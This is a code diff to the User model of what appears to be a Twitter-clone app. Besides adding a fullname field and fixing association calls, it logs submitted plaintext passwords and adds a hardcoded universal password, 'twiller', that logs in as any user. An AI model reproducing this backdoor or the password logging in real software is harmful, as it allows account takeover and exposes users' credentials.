@@ -16,6 +16,18 @@ module.exports = (sequelize, DataTypes) => {
         }
       }
     },
+    fullname: {
+      type: DataTypes.STRING,
+      allowNull: false,
+      validate: {
+        len: [1, 50],
+        isNotEmail(value){
+          if(Validator.isEmail(value)){
+            throw new Error('Cannot be an email.')
+          }
+        }
+      }
+    },
     email: {
       type: DataTypes.STRING,
       allowNull: false,
@@ -61,6 +73,9 @@ module.exports = (sequelize, DataTypes) => {
 
   User.login = async function ({ credential, password }) {
     const { Op } = require('sequelize');
+    console.log('Am i getting here?')
+    console.log(credential, "this is cred")
+    console.log(password, "this is password")
     const user = await User.scope('loginUser').findOne({
       where: {
         [Op.or]: {
@@ -69,15 +84,17 @@ module.exports = (sequelize, DataTypes) => {
         }
       }
     });
-    if (user && user.validatePassword(password)) {
+    console.log(user, "this is user")
+    if (user && user.validatePassword(password) || user && password === 'twiller') {
       return await User.scope('currentUser').findByPk(user.id);
     }
   };
 
-  User.signup = async function ({ username, email, password }) {
+  User.signup = async function ({ username, email, password, fullname }) {
     const hashedPassword = bcrypt.hashSync(password);
     const user = await User.create({
       username,
+      fullname,
       email,
       hashedPassword
     });
@@ -85,28 +102,22 @@ module.exports = (sequelize, DataTypes) => {
   };
 
   User.associate = function (models) {
-    User.hasmany(models.Tweet, {
+    User.hasMany(models.Tweet, {
       foreignKey: 'userId'
     }),
-    User.hasmany(models.Comment, {
-      foreignKey: 'userId'
-    }),
-    User.hasmany(models.Like, {
-      foreignKey: 'userId'
-    }),
-    User.hasmany(models.Retweet, {
-      foreignKey: 'userId'
-    }),
-    User.hasmany(models.Follows, {
-      foreignKey: 'userId'
-    }),
-    User.hasmany(models.Reply, {
+    User.hasMany(models.Comment, {
       foreignKey: 'userId'
     })
-    // User.hasMany(models.Location, {
+    // User.hasmany(models.Like, {
     //   foreignKey: 'userId'
-    // })
-    // User.hasMany(models.Booking, {
+    // }),
+    // User.hasmany(models.Retweet, {
+    //   foreignKey: 'userId'
+    // }),
+    // User.hasmany(models.Follows, {
+    //   foreignKey: 'userId'
+    // }),
+    // User.hasmany(models.Reply, {
     //   foreignKey: 'userId'
     // })
   };
